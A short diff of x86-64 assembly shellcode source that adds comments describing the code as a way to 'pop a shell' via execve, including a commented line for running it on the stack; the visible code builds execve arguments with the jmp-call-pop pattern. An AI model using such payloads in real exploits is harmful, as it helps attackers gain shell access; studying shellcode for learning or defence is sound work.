@@ -1,3 +1,11 @@
+;---------------------------------
+;bplinux@posteo.de
+;
+;this is used to pop a shell
+;(or whatever) with clean pointer
+;arrangements for execve
+;---------------------------------
+
 [BITS 64]
 
 EXECVE	equ 59
@@ -8,6 +16,7 @@ segment .text
 _start:	jmp _call
 _back:	pop rdi
 	xor rax, rax
+	;mov [rdi+7], al ;for execution on stack
 	push rax
 	push rdi
 	lea rsi, [rsp]
